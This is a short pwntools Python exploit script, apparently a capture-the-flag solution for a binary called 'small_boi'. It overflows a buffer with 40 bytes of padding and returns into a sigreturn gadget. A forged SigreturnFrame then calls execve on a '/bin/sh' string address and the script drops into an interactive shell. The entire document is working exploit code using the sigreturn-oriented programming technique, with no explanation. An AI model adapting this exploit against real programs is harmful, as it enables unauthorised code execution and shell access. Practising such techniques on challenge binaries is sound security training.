from pwn import *

r = process("./small_boi")

#r = remote("localhost", 1337)

context.arch = 'amd64'
padding = 'A' * 40

sigrop = 0x400180
syscall = 0x400185

#binary = ELF("./sigrop")
#binsh = binary.symbols['useful_string']
binsh = 0x4001ca

s = SigreturnFrame(kernel='amd64')

s.rax = constants.SYS_execve
s.rdi = binsh
s.rsi = 0
s.rdx = 0
s.rip = syscall


payload = padding + p64(sigrop) + str(s)

pause()
r.send(payload)

r.interactive()
